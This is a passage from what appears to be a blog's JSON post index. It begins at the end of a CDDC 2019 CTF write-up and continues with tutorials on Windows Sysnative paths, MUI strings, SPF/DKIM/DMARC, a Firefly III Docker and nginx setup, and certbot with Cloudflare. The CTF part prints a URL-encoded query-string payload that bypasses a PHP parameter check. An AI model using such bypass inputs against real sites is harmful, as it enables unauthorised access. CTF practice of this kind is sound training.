\u0026#34;CTF{Flag}\u0026#34;; } else { echo \u0026#34;Param value not correct\u0026#34;; } } else { echo \u0026#34;Required param not set\u0026#34;; } ?\u0026gt;After some testing we found out these 2 conditions has to be true.\n strting must start with _ last position of _ in string must be 0  Which is not possible if we want to set the get parameter _1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ-qwertyuiopasdfghjklzxcvbnm_. Then it just hit me that the korean subdomain is a hint to the solution, url encoding. Since $_SERVER[\u0026quot;QUERY_STRING\u0026quot; gets the query string without parsing it, this should work.\nI used this Cyber Chef recipe to url encode _1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ-qwertyuiopasdfghjklzxcvbnm_.\nTo_Hex('Space')\rFind_/_Replace({'option':'Regex','string':'\\\\s'},'%',true,false,true,false)\rFind_/_Replace({'option':'Regex','string':'^'},'%',true,false,true,false)\rThis is our payload url.\nhttp://가나다라마바사아자차카타파하.cddc19q.ctf.sg/?%5f%31%32%33%34%35%36%37%38%39%30%2d%41%42%43%44%45%46%47%48%49%4a%4b%4c%4d%4e%4f%50%51%52%53%54%55%56%57%58%59%5a%2d%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%5f=🚣‍♀️ 🚣🏻‍♀️ 🚣🏼‍♀️ 🚣🏽‍♀️ 🚣🏾‍♀️ 🚣🏿‍♀️ 🚣‍♂️ 🚣🏻‍♂️ 🚣🏼‍♂️ 🚣🏽‍♂️ 🚣🏾‍♂️ 🚣🏿‍♂️\rSure enought it worked.\nFlag $CDDC19${PHP_tricks_are_very_fun!}\r","permalink":"https://dzhy.dev/posts/2019-06-04-cddc-2019-qualifiers-writeup/","summary":"This year\u0026rsquo;s CDDC Qualifiers was very different from the previous year which was more of an \u0026lsquo;red team\u0026rsquo; ctf, this year\u0026rsquo;s qualifiers is a jeopardy style ctf and it\u0026rsquo;s pretty focused on OSINT which I\u0026rsquo;m not really into, but anyways here are the writeups for some of the more interesting challenges I solved.\n[B-1] Fight the Binary Monster Category: OSINT_Blue\n Drats, we found an unknown executable that someone uploaded to one of our web servers.","title":"CDDC 2019 Qualifiers Writeup"},{"content":"So I was using 32-bit python on windows and trying to read a binary in System32.\nwith open(r\u0026#39;C:\\Windows\\System32\\FileHistory.exe\u0026#39;, \u0026#39;rb\u0026#39;) as f: content = f.read() Then I was thrown the following error.\nThis makes no sense, I know the file exists in System32.\nAfter some hair tearing and swearing, I figured it out. This error occurs because 32-bit applications are redirected to SysWOW64 when they try to access System32 and there is no FileHistory.exe in SysWOW64.\nTo access the real System32 with 32-bit applications, replace System32 with Sysnative. Sysnative is a special alias that is only visible and accessible from 32-bit programs. So in this case I have to use the following path to actually read the file.\nwith open(r\u0026#39;C:\\Windows\\Sysnative\\FileHistory.exe\u0026#39;, \u0026#39;rb\u0026#39;) as f: content = f.read() Why? Microsoft wants to split the DLLs and other stuff used by 64-bit and 32-bit applications. 64-bit DLLs will be located in System32 because it is a hardcoded path by a lot of apps.\nIntuitively SysWOW64 seems like it should contain 64-bit stuff, but WOW64 stands for Windows 32-bit on Windows 64-bit so it actually contains 32-bit stuff.\n In computing on Microsoft platforms, WoW64 (Windows 32-bit on Windows 64-bit) is a subsystem of the Windows operating system capable of running 32-bit applications on 64-bit Windows.\n Why not keep 32-bit stuff in System32 and apply the redirection to 64-bit apps instead, and name the 64-bit folder something more intuitive like System64 so it won\u0026rsquo;t be so confusing? Maybe Microsoft is in the forefront of implementing security by confusion.\nResources  The \u0026lsquo;Sysnative\u0026rsquo; folder in 64-bit Windows explained Difference between System32 and SysWOW64 folders in Windows 10 WOW64  ","permalink":"https://dzhy.dev/posts/2019-05-21-system32-magic/","summary":"So I was using 32-bit python on windows and trying to read a binary in System32.\nwith open(r\u0026#39;C:\\Windows\\System32\\FileHistory.exe\u0026#39;, \u0026#39;rb\u0026#39;) as f: content = f.read() Then I was thrown the following error.\nThis makes no sense, I know the file exists in System32.\nAfter some hair tearing and swearing, I figured it out. This error occurs because 32-bit applications are redirected to SysWOW64 when they try to access System32 and there is no FileHistory.","title":"System32 Magic"},{"content":"Prelude The Windows Binaries I\u0026rsquo;m talking about here are the ones that comes default with Windows provided by Microsoft.\nSearching for Strings in the binary I was analyzing a Windows binary C:\\Windows\\System32\\where.exe when I realized the help text of the binary cannot be found anywhere in the binary.\nAfter some futher investigation using Process Monitor from Windows Sysinternals I found out that it is reading from C:\\Windows\\System32\\en-US\\where.exe.mui during it\u0026rsquo;s execution.\nSearching for Strings in the MUI I did some googling to find out more about the MUI file type and realized that it\u0026rsquo;s how Windows enable support for different user interface languages.\n Multilingual User Interface (MUI) enables the localization of user interfaces for globalized applications. MUI also supports the creation of resources for any number of user interface languages.\n Further googling on how to open it says that it can be opened using 7zip, so I did and found the strings in .rsrc\\string.txt in the archieve.\n52\tType \u0026quot;WHERE /?\u0026quot; for usage help.\\n\r58\tERROR: Invalid directory specified.\\n\r60\tERROR: \u0026quot;$env:pattern\u0026quot; cannot be used with /R.\\n\r63\tERROR: Missing pattern in \u0026quot;$env:pattern\u0026quot;.\\n\r64\tINFO: Could not find \u0026quot;%s\u0026quot;.\\n\r--------------------------snip--------------------------\rWhat\u0026rsquo;s weird is when I ran linux\u0026rsquo;s strings on the MUI file which did not manage to find the strings in the MUI file, so I initially thought that the MUI file is compressed.\nI then ran file on where.exe.mui and it returned PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, I thought that\u0026rsquo;s weird, so I tried opening the file in CFF Explorer and it worked! So a MUI file is actually a PE file.\nIf we check the resource directories of where.exe.mui using CFF Explorer we can see a resource directory called String Tables. If we check the data within the Directory, we can find all the strings we previously seen using 7zip.\nThe only thing that\u0026rsquo;s weird was each character was followed by a null byte, which turns out to be because the strings are stored as unicode. Now it makes sense why linux\u0026rsquo;s strings did not find anything, it does not search for unicode strings. I tried again with the strings tool from Windows Sysinternals and it managed to find the strings because it also searches for unicode strings.\nI also looked at bash.exe.mui and realized that the strings can also be in the MESSAGETABLE section of the resource directory, which have the ID of 0xb.\n All the resource type can be found from the Microsoft Documentation.\n Ending Notes Most of the Windows binaries does this, but not all, if you want to extract all the strings used by a Windows binary you should combine finding strings in the binary and the MUI.\nThe strings can be in STRING (ID of 0x6) and MESSAGETABLE (ID of 0xb) section of the resource directory of the MUI file.\nI have made a tool in rust to retrieve the strings from a MUI file.\n","permalink":"https://dzhy.dev/posts/2019-05-04-where-are-the-strings-in-windows-binaries/","summary":"Prelude The Windows Binaries I\u0026rsquo;m talking about here are the ones that comes default with Windows provided by Microsoft.\nSearching for Strings in the binary I was analyzing a Windows binary C:\\Windows\\System32\\where.exe when I realized the help text of the binary cannot be found anywhere in the binary.\nAfter some futher investigation using Process Monitor from Windows Sysinternals I found out that it is reading from C:\\Windows\\System32\\en-US\\where.exe.mui during it\u0026rsquo;s execution.","title":"Where are the Strings in Windows Binaries"},{"content":"Preventing email spoofing is important to all domain owners, even if you are not using your domain for email services as it affects the reputation of your domain. In this post I will talk about how to prevent email spoofing with SPF, DKIM and DMARC.\nSender Policy Framework (SPF) SPF allows the receiver to check that an email claiming to come from a specific domain comes from an IP address authorized by that domain\u0026rsquo;s administrators. The list of authorized sending hosts and IP addresses for a domain is in the SPF record for the domain which is published in the DNS TXT records for that domain.\nHow it works The receiver checks if the sender is valid by querying the domain in the message header field Return-Path aka MAIL FROM for SPF record and checking the sender\u0026rsquo;s IP against that record.\nSetup Place the SPF record at the root of your domain.\n   Directive Effect     -all non-matching emails will be rejected   ~all non-matching emails will be accepted but marked   +all allows any ip to send email from your domain.    This SPF record below will allow emails from 10.0.0.1, 2001:0db8:85a3:0000:0000:8a2e:0370:7334 and all the allowed IPs from the spf record from example.com and reject emails sent from all other IPs.\nv=spf1 ip4:10.0.0.1 ip6:2001:0db8:85a3:0000:0000:8a2e:0370:7334 include:example.com -all\rFor more options check out the rfc.\nThings to Note SPF records cannot include more than ten dns queries.\nA single TXT record cannot be more than 255 characters, but we can concate TXT records to form a SPF record of a longer length.\n The DNS overhead for a reply that contains a single TXT record with two strings is about 34 bytes, plus the length of the hostname that’s being queries (e.g. \u0026ldquo;spf.example.com\u0026rdquo; is 15 bytes). So to keep within the 512 byte limit you need to break your SPF into chunks of no more than 478 minus the length of the hostname.\n Another option is SPF record chaining.\nYou can check your spf record using this SPF Checker.\nMacros It is possible to create more complex SPF records using marcros.\nProblem SPF does not validate the From header which is shown in most clients as the actual sender of the message, but uses the Return-Path to determine the sending domain.\nFor example, a email was sent with the Return-Path of example.com and a From field of david@dzhy.dev assuming dzhy.dev have SPF setup to not allow any IPs, if example.com has a SPF record that allows my IP, the SPF check will still pass, because it does not check the From field, instead it checks the Return-Path.\nDomain Keys Identified Mail (DKIM) DKIM checks that an email was indeed send and authorized by the owner of that domain using digital signatures. This DKIM signature is a header that is added to the message and is secured with encryption.\nHow it works The DKIM signature is generated by the MTA (Mail Transfer Agent). It creates a hash of the email. This hash value is encrypted using the private key and attached to the email as the DKIM signature in the header.\nAfter receiving the email, the receiver verifies the DKIM signature using the public key in the TXT record of the domain specified in the signature, by decrypting the DKIM signature and comparing the decrypted hash value with the hash value of the email it received. If these two hashes are the same the MTA knows that the email has not been altered. This gives the user confirmation that the email was actually sent from the listed domain.\nSetup Refer to your email service provider\u0026rsquo;s documentation. Typically all you have to do is to add a DNS TXT record to your domain.\nFinding DKIM selector The DKIM record is at selector._domainkey.dzhy.dev, the selector can be any string, we can only find out the selector of a domain if we have the DKIM-Signature, of a email sent by that domain.\nIn the signature, the s field is the selector, so in this case s=zoho means the selector is zoho and the DKIM public key will be at zoho._domainkey.dzhy.dev.\nDKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; t=1554622568; s=zoho; d=dzhy.dev; i=david@dzhy.dev; h=Date:From:To:Message-Id:Subject:MIME-\rVersion:Content-Type; l=721; bh=YLjE/ckf0hWWS6SSYjvfMS06DZjBcD0C0ignKAs7TUs=;\rb=HT4wf4u2t5PiApv9zgAWiyTbC8dwoE5qV7vZbGO+/1t+XUPOOlwGV3tfM/0/GqYl\roVtsVDqykG1B2iKGlXIDJGSU6qzsuzxCmHlv3YaddIR7WWLteCvMM4lOg3ZzwSHtiNx dVwG2fJ/iSgzB1AFrSQJa/C21ZewOKL0J8piwKYg=\rProblem The dkim signature can be valid and have no relation to the From header.\nFor example, I can have the following DKIM signature\nDKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; t=1554622568; s=zoho; d=dzhy.dev; i=david@dzhy.dev; h=Date:From:To:Message-Id:Subject:MIME-\rVersion:Content-Type; l=721; bh=YLjE/ckf0hWWS6SSYjvfMS06DZjBcD0C0ignKAs7TUs=;\rb=HT4wf4u2t5PiApv9zgAWiyTbC8dwoE5qV7vZbGO+/1t+XUPOOlwGV3tfM/0/GqYl\roVtsVDqykG1B2iKGlXIDJGSU6qzsuzxCmHlv3YaddIR7WWLteCvMM4lOg3ZzwSHtiNx dVwG2fJ/iSgzB1AFrSQJa/C21ZewOKL0J8piwKYg=\rwhich is for the domain dzhy.dev but my From field is david@example.com, this will be valid because the signature is valid for the given domain dzhy.dev, it does not check the signature using the domain in the From field.\nDomain-based Message Authentication, Reporting \u0026amp; Conformance (DMARC) DMARC builds on the widely deployed SPF and DKIM protocols, to improve and monitor protection of the domain from fraudulent email. It is meant to fix the issues of SPF and DKIM. Implementing SPF and DKIM by themselves does not prevent spoofing, but combined with DMARC they will work great.\nDMARC requires authentication alignment with the domain used in the header From, for both SPF and DKIM. Meaning the domain in DKIM must share the same organizational domain as the From header or be the exact same depending on the configuration, the domain for SPF the Return-Path and the header From should share an organizational domain or be the exact same depending on the configuration.\nHow it works The receiver extracts the domain in the From header, and queries for a DMARC policy record of that domain. If it exists, perform DKIM and SPF checks, then perform Identifier Alignment checks. Emails that fail the DMARC mechanism check are disposed of in accordance with the discovered DMARC policy of the Domain Owner.\nSetup Domain Owner DMARC preferences are stored as DNS TXT records in subdomains named _dmarc. For example, the Domain Owner of example.com would post DMARC preferences in a TXT record at _dmarc.example.com.\nThe table below explains each tag of the sample DMARC policy.\n   Tag Effect     v=DMARC1 Specify DMARC version   p=reject Reject any mail that fails the DMARC check   rua=mailto:dmarc@dzhy.dev Send aggregate reports to dmarc@dzhy.dev   adkim=s DKIM Identifier Alignment strict mode   adkim=s SPF Identifier Alignment strict mode   ruf=mailto:dmarc@dzhy.dev Send failure reports to dmarc@dzhy.dev   fo=1 Generate a DMARC failure report if any checks failed     By default daily aggregate reports will be sent if you set a rua address.\n Sample DMARC policy.\nv=DMARC1; p=reject; rua=mailto:dmarc@dzhy.dev; adkim=s ; aspf=s ; ruf=mailto:dmarc@dzhy.dev ; fo=1\rFor other options refer to rfc7489 Section 6.3\nResources  SPF RFC 7208 DKIM Development, Deployment and Operations DMARC Specification  ","permalink":"https://dzhy.dev/posts/2019-04-11-securing-email-domain/","summary":"Preventing email spoofing is important to all domain owners, even if you are not using your domain for email services as it affects the reputation of your domain. In this post I will talk about how to prevent email spoofing with SPF, DKIM and DMARC.\nSender Policy Framework (SPF) SPF allows the receiver to check that an email claiming to come from a specific domain comes from an IP address authorized by that domain\u0026rsquo;s administrators.","title":"Preventing Email Spoofing"},{"content":"In this tutorial we will setup Firefly III using docker and setup a reverse proxy to enable https, as Firefly III itself does not support https. For the purpose of this tutorial we will be using firefly.example.com as the domain.\n Note: This tutorial assumes you have already setup a mysql/postgres database.\n Docker  If you have not yet installed docker refere to docker install documentation to install it first.\n First we create persistent volumes to store uploaded files and exported data.\ndocker volume create firefly_iii_export docker volume create firefly_iii_upload To ensure the site works behind our reverse proxy and all the links on the site is using https we have to set the following environment variables.\nAPP_URL=https://firefly.example.com TRUSTED_PROXIES=** The app key is any 32 character alphanumeric string. The database by default is assumed to be MySQL, if you are using a Postgres database you have to set an extra environment vairable DB_CONNECTION=pgsql.\nThe following command will run the firefly-iii container and map it to port 4040 on the host.\ndocker run -d \\ -v firefly_iii_export:/var/www/firefly-iii/storage/export \\ -v firefly_iii_upload:/var/www/firefly-iii/storage/upload \\ -p 127.0.0.1:4040:80 \\ -e FF_APP_ENV=local \\ -e FF_APP_KEY=12345678901234567890123456789012 \\ -e FF_DB_HOST=CHANGEME \\ -e FF_DB_PORT=CHANGEME \\ -e FF_DB_NAME=CHANGEME \\ -e FF_DB_USER=CHANGEME \\ -e FF_DB_PASSWORD=CHANGEME \\ -e APP_URL=https://firefly.example.com \\ -e TRUSTED_PROXIES=** \\ --name firefly-iii-c1 \\ jc5x/firefly-iii:latest Enable Recurring Transactions  You can ignore this if you are not planning on using recurring transactions.\n Drop into shell on the container\ndocker exec -it firefly-iii-c1 /bin/bash Install cron in docker container\napt update apt install cron Run crontab -e to edit cronjobs, then add the following cron job to enable recurring transactions.\n0 0 * * * /usr/local/bin/php /var/www/firefly-iii/artisan firefly:cron\rThese changes will persist even if you restart the container, however if you start another container from the image jc5x/firefly-iii:latest you have to do these steps again.\nSetup Nginx If you are using cloudflare as your dns provider, you can refer to [this post]({% post_url 2019-04-03-Certbot-Cloudflare-DNS-Plugin %}) on getting TLS certificates from Let\u0026rsquo;s Encrypt using the cloudflare dns plugin.\nThis is a sample site configuration for nginx. Change firefly.example.com to your domain. You should also change the proxy_pass parameter on line 17 if you mapped the host port of Firefly III to a port other than 4040, or if the docker container is running on another host.\nserver {\rlisten 443 ssl http2;\rlisten [::]:443 ssl http2;\rserver_name firefly.example.com;\r# SSL\rssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;\rssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;\rssl_trusted_certificate /etc/letsencrypt/live/example.com/chain.pem;\r# logging\raccess_log /var/log/nginx/firefly.example.com.access.log;\rerror_log /var/log/nginx/firefly.example.com.error.log warn;\r# reverse proxy\rlocation / {\rproxy_pass http://127.0.0.1:4040;\rproxy_http_version 1.1;\rproxy_cache_bypass $http_upgrade;\rproxy_set_header Upgrade $http_upgrade;\rproxy_set_header Connection \u0026quot;upgrade\u0026quot;;\rproxy_set_header Host $host;\rproxy_set_header X-Real-IP $remote_addr;\rproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\rproxy_set_header X-Forwarded-Proto $scheme;\rproxy_set_header X-Forwarded-Host $host;\rproxy_set_header X-Forwarded-Port $server_port;\r}\r# security headers\radd_header X-Frame-Options \u0026quot;SAMEORIGIN\u0026quot; always;\radd_header X-XSS-Protection \u0026quot;1; mode=block\u0026quot; always;\radd_header X-Content-Type-Options \u0026quot;nosniff\u0026quot; always;\radd_header Referrer-Policy \u0026quot;no-referrer-when-downgrade\u0026quot; always;\radd_header Content-Security-Policy \u0026quot;default-src * data: 'unsafe-eval' 'unsafe-inline'\u0026quot; always;\radd_header Strict-Transport-Security \u0026quot;max-age=31536000; includeSubDomains; preload\u0026quot; always;\r# . files\rlocation ~ /\\.(?!well-known) {\rdeny all;\r}\r# gzip\rgzip on;\rgzip_vary on;\rgzip_proxied any;\rgzip_comp_level 6;\rgzip_types text/plain text/css text/xml application/json application/javascript application/xml+rss applica\rtion/atom+xml image/svg+xml;\r}\r# subdomains redirect\rserver {\rlisten 443 ssl http2;\rlisten [::]:443 ssl http2;\rserver_name *.firefly.example.com;\r# SSL\rssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;\rssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;\rssl_trusted_certificate /etc/letsencrypt/live/example.com/chain.pem;\rreturn 301 https://firefly.example.com$request_uri;\r}\r# HTTP redirect\rserver {\rlisten 80;\rlisten [::]:80;\rserver_name .firefly.example.com;\rlocation / {\rreturn 301 https://firefly.example.com$request_uri;\r}\r}\rResources  Installation Documentation Cronjob Documentation  ","permalink":"https://dzhy.dev/posts/2019-04-06-firefly-iii-setup-with-docker-and-https/","summary":"In this tutorial we will setup Firefly III using docker and setup a reverse proxy to enable https, as Firefly III itself does not support https. For the purpose of this tutorial we will be using firefly.example.com as the domain.\n Note: This tutorial assumes you have already setup a mysql/postgres database.\n Docker  If you have not yet installed docker refere to docker install documentation to install it first.","title":"Firefly III Setup with Docker and HTTPS"},{"content":"In this tutorial we will get a wildcard certificate from letsencrypt using the cloudflare dns plugin. For the purpose of this tutorial we will be using example.com as the domain.\nInstall Cloudflare DNS Plugin This tutorial assumes you have already installed certbot. If you have not, you can follow the instructions from certbot-eff.\nsudo apt update sudo apt install python3-certbot-dns-cloudflare -y API Credentials mkdir -p /root/secrets/certbot Retrieve your api key from cloudflare.\n  Login to the Cloudflare account. Go to My Profile. Scroll down to API Keys and locate Global API Key. Click API Key to see your API identifier.   Create the file below with your cloudflare information. We will save the file at /root/secrets/certbot/cloudflare.ini.\n# Cloudflare API credentials used by Certbot\rdns_cloudflare_email = cloudflare@example.com\rdns_cloudflare_api_key = 0123456789abcdef0123456789abcdef01234567\rSecure the folder and file.\nfind /root/secrets -type d -exec chmod 700 {} \\; find /root/secrets -type f -exec chmod 600 {} \\; Requesting for Certificate The --dns-cloudflare-propagation-seconds option defines the number of seconds to wait before doing the validation checks, you can change it accordingly.\nIt is important that we specify the server to be the ACME v2 server as the v1 server does not support wildcard certificates.\ncertbot certonly \\  --preferred-challenges dns \\  --email admin@example.com --dns-cloudflare-credentials /root/secrets/certbot/cloudflare.ini \\  --dns-cloudflare-propagation-seconds 60 \\  -d \u0026#34;*.example.com\u0026#34; -d example.com \\  --server https://acme-v02.api.letsencrypt.org/directory \\  --agree-tos We should now have our cert at /etc/letsencrypt/live/example.com/.\nroot@server:~# ls -la /etc/letsencrypt/live/example.com total 12 drwxr-xr-x 2 root root 4096 Apr 3 10:44 . drwx------ 3 root root 4096 Apr 3 10:44 .. lrwxrwxrwx 1 root root 34 Apr 3 10:44 cert.pem -\u0026gt; ../../archive/example.com/cert1.pem lrwxrwxrwx 1 root root 35 Apr 3 10:44 chain.pem -\u0026gt; ../../archive/example.com/chain1.pem lrwxrwxrwx 1 root root 39 Apr 3 10:44 fullchain.pem -\u0026gt; ../../archive/example.com/fullchain1.pem lrwxrwxrwx 1 root root 37 Apr 3 10:44 privkey.pem -\u0026gt; ../../archive/example.com/privkey1.pem -rw-r--r-- 1 root root 692 Apr 3 10:44 README Resources  Certbot-eff certbot-dns-cloudflare Cloudflare API Key  ","permalink":"https://dzhy.dev/posts/2019-04-03-certbot-cloudflare-dns-plugin/","summary":"In this tutorial we will get a wildcard certificate from letsencrypt using the cloudflare dns plugin. For the purpose of this tutorial we will be using example.com as the domain.\nInstall Cloudflare DNS Plugin This tutorial assumes you have already installed certbot. If you have not, you can follow the instructions from certbot-eff.\nsudo apt update sudo apt install python3-certbot-dns-cloudflare -y API Credentials mkdir -p /root/secrets/certbot Retrieve your api key from cloudflare.","title":"Certbot - Cloudflare DNS Plugin"}]